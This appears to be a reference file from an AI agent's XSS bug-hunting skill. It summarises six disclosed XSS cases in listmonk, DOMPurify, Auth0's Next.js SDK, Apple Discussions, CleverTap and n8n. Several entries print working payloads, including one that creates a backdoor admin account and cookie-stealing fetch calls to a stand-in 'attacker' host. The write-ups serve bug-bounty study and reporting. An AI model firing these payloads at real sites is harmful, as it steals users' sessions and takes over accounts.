---
name: case-studies
description: case-studies reference material.
---

# Real Impact Examples (Case Studies)

Part of `skills/hunt-xss/SKILL.md`. Read this ONLY when you want full narrative-style write-ups of disclosed bugs for report-framing inspiration, not just the technique.

---

## Real Impact Examples

**Example 1 — `listmonk-stored-xss-archive-trigger-admin-ato` (low five-figure bounty range, multi-link admin ATO chain — GHSA-jmr4-p576-v565 NVD-verified)**
- Setup: listmonk self-hosted newsletter platform v5.1.0. Multi-user installation with Super Admin and lower-priv Campaign Manager roles. Public archive feature enabled by default for share-with-non-subscribers use case.
- Discovery: hunter audited listmonk's campaign-rendering code on GitHub. Saw raw HTML body field rendered via `{{ . | Safe }}` template directive (Go template equivalent of `dangerouslySetInnerHTML`). Confirmed via local test deploy that lower-priv user can submit raw HTML in campaign body and template body, plus the campaign archive endpoint renders the same content publicly.
- Exploitation: Created campaign as Campaign Manager with payload `<img src=x onerror="fetch('/api/users', {method:'POST', body: JSON.stringify({username:'backdoor', password:'Hacked123', role:'admin'}), headers:{'Content-Type':'application/json'}})">`. Enabled campaign archive. Shared archive link with super admin — when super admin opened the URL (no preview click required), the XSS fired in their authenticated context, creating the backdoor admin account.
- Impact: Lower-priv user → full Super Admin via single link visit. Backdoor admin enables export of all subscribers, modify SMTP, delete all campaigns, access API keys / secrets. CVSS 8.0 High.
- Disclosed source: https://github.com/knadh/listmonk/security/advisories/GHSA-jmr4-p576-v565 (knadh, Jan 2 2026). Reported via listmonk's GitHub Security Advisories disclosure.

**Example 2 — `dompurify-mxss-nesting-bypass-stored-admin-context` (mid five-figure direct + downstream consumers, mXSS family — CVE-2024-47875 NVD-verified)**
- Setup: SaaS application uses DOMPurify 3.0.x to sanitize user-submitted comment HTML before storage. Sanitized content rendered on comment-list page, accessible to admins for moderation.
- Discovery: hunter checked target's `package.json` (exposed via `/_next/static/.../package.json` or SBOM endpoint), identified `dompurify@3.0.5` (vulnerable per NVD CVE-2024-47875 — affects <3.1.3). Read the IcesFont nesting-based mXSS payload from cure53berlin's disclosed advisory at https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf.
- Exploitation: Submitted comment with the verbatim nesting-based mXSS payload. DOMPurify sanitized the payload to "safe-looking" HTML; content stored in DB. When admin opened the comment-moderation page, the browser parsed the stored HTML in a slightly different context (innerHTML assignment on the moderation list); the deep-nested structure mutated into executable form, firing `alert(document.domain)` in admin browser. Pivoted to fetch admin session cookie via `fetch('//attacker/'+document.cookie)`.
- Impact: Cross-user XSS via mXSS bypass of current-tier sanitizer. Affects every consumer of DOMPurify <3.1.3 in admin-content-rendering pattern. Direct payment from Cure53 / Snyk for the primitive demonstration; per-target bounty for each affected SaaS in mid four-figure to low five-figure tier.
- Disclosed source: CVE-2024-47875 (NVD-verified); GHSA-gx9m-whjm-85jf (cure53/DOMPurify, Oct 11 2024); IcesFont via @cure53berlin original disclosure; companion CVE-2024-45801 / GHSA-mmhx-hmjr-r674 for backport-related variant; Yaniv Nizry @YNizry Dec 2024 for non-default-config 3.2.1 bypass; Fluid Attacks Research GHSA-h8r8-wccr-v5f2 for Re-Contextualization variant in 3.3.1; mizu.re writeup at https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes.

**Example 3 — `auth0-nextjs-returnto-javascript-scheme-token-theft` (low to mid five-figure bounty range, OAuth chain — CVE-2025-67716 NVD-verified)**
- Setup: SaaS application uses `@auth0/nextjs-auth0@4.10.0` for authentication. Login flow: user clicks "Login" → redirect to Auth0 → user authenticates → redirect back to `/api/auth/callback?returnTo=<original_page>`. SDK's login handler accepts `returnTo` parameter and uses it for post-auth redirect.
- Discovery: hunter checked target's package.json or JS bundle for Auth0 SDK version. Identified vulnerable version (>=4.9.0 and <4.13.0 per NVD CVE-2025-67716 advisory). Crafted attacker page with `<a href="https://target/api/auth/login?returnTo=javascript:fetch('//attacker/'+document.cookie)">Click to login</a>`.
- Exploitation: Victim clicked attacker link, completed normal Auth0 authentication, was redirected by SDK to `location.href = "javascript:fetch('//attacker/'+document.cookie)"`. JavaScript scheme executed in target origin context, exfiltrating session cookie.
- Impact: 1-click ATO via OAuth returnTo XSS. Affects all Auth0 nextjs-auth0 consumers in the vulnerable version range. Disclosed by Joshua Rogers (@MegaManSec) via Okta's responsible disclosure.
- Disclosed source: https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-mr6f-h57v-rpj5 (auth0/nextjs-auth0, Dec 10 2025); CVE-2025-67716 (NVD-verified, CVSS 5.7); Okta security team coordinated disclosure.

**Example 4 — `apple-discussions-stored-xss-cross-mirror` ($5,000 bounty, Apple Security Bounty — ZombieHack May-Jul 2025)**
- Setup: discussions.apple.com community forum platform. Comment / thread fields with rich-content support. Content rendered across multiple Apple international mirrors and developer.apple.com/forums.
- Discovery: ZombieHack (Youssef Desouki) tested input fields on discussions.apple.com during routine review of Apple web assets. Found stored XSS in a previously unfiltered pathway (specific field not disclosed in writeup). Apple applied partial fix April 5 2025; ZombieHack identified bypass that re-enabled the vulnerability across international mirrors and developer.apple.com/forums.
- Exploitation: Submitted XSS payload, confirmed execution via screenshot showing `alert(document.domain)` firing on each mirror. URL manipulation triggered automatic execution without user interaction.
- Impact: Stored XSS in Apple developer forum context. Could exfil developer session cookies, access developer-only APIs, harvest enterprise certificate management UIs.
- Disclosed source: https://medium.com/@ZombieHack/apple-developer-stored-xss-5-000-bounty-writeup-2025-cc34a030a5bf (Youssef Desouki / @ZombieHack, Nov 2025); Apple Security Bounty program; payment $5,000 issued Jul 31 2025.

**Example 5 — `clevertap-postmessage-origin-includes-bypass-bank-session-xss` (low five-figure bounty range on financial program, multi-origin chain — CleverTap issue #424 disclosed Jun 2025)**
- Setup: Bank's web banking platform embeds CleverTap analytics chat widget at v1.15.2. Widget SDK listens for postMessage events; v1.15.2 added an origin check using `.includes('clevertap.com')` to validate sender. The `event.data.display.details[0].html` field is assigned to `element.innerHTML` in the SDK's `renderCustomHtml` function.
- Discovery: hunter audited the CleverTap web SDK source on GitHub (issue #424 by Mr-Neutr0n Jun 2025). Identified the `.includes()` origin check as bypassable via subdomain trick. Registered `dashboard.clevertap.com.attacker.com` (own domain `attacker.com` with subdomain). Confirmed `.includes('clevertap.com')` returns true for that origin.
- Exploitation: Crafted attacker page that embedded the bank's login page in an iframe, then sent a postMessage from `dashboard.clevertap.com.attacker.com` containing JSON with `display.details[0].html = "<img src=x onerror=fetch('//attacker/'+document.cookie)>"`. CleverTap SDK received the message, passed origin check via `.includes()`, parsed JSON, assigned HTML to innerHTML — XSS executed in bank's authenticated session, exfiltrating session cookie.
- Impact: Cross-origin XSS in bank session via vendor SDK. Compromises any bank embedding the affected CleverTap version. Pattern repeats across other chat widgets with similar origin-check bugs (Drift, Crisp, Intercom historical versions).
- Disclosed source: https://github.com/CleverTap/clevertap-web-sdk/issues/424 (Mr-Neutr0n Jun 5 2025); fix in CleverTap 1.15.3; pattern documented at https://bugbounty.info/Attack-Surface/Web/Client-Side/postMessage-Vulnerabilities. Per-bank bounties via affected program; SDK fix bounty via CleverTap.

**Example 6 — `n8n-mcp-oauth-client-name-admin-dialog-xss` (low five-figure bounty range on workflow automation platforms — GHSA-537j-gqpc-p7fq)**
- Setup: n8n exposes MCP OAuth client registration for workflow automation integrations. Admins review OAuth consent dialogs where attacker-supplied `client_name` renders in HTML.
- Discovery: researcher registered an MCP/OAuth client with HTML in `client_name` and observed that the authorization dialog rendered it without safe escaping in affected n8n versions.
- Exploitation: attacker sends admin a legitimate-looking MCP authorization URL. Admin opens consent dialog; crafted `client_name` executes JavaScript in the n8n admin origin before consent. Payload can read workflow credentials visible to the admin session or call workflow-management APIs as that admin.
- Impact: unauthenticated XSS to admin-context compromise in an automation platform that stores high-value credentials for GitHub, Slack, cloud APIs, databases, and internal webhooks.
- Disclosed source: GHSA-537j-gqpc-p7fq (n8n MCP OAuth XSS, fixed in patched n8n release lines). Bounty range low five-figure on workflow-automation / MCP platforms when admin-context credential access is demonstrated safely.

